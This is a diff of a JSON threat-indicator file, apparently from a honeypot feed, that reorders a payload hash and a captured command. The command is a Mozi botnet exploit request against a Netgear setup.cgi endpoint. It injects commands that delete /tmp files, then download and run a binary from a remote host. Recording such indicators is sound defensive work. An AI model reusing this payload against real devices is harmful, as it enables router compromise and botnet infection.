@@ -6,16 +6,16 @@
     "value": "hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
   },
   {
-    "context": "Inbound payload hash (unknown)",
-    "source": "static_analysis",
-    "type": "hash",
-    "value": "edaffc63f29b42ae9ff2213fab36fb1c98436552031b0c76c012c085a0b7ce55"
-  },
-  {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+/tmp/netgear;s"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "edaffc63f29b42ae9ff2213fab36fb1c98436552031b0c76c012c085a0b7ce55"
   },
   {
     "asn": "Cyber Internet Services (Pvt) Ltd.",
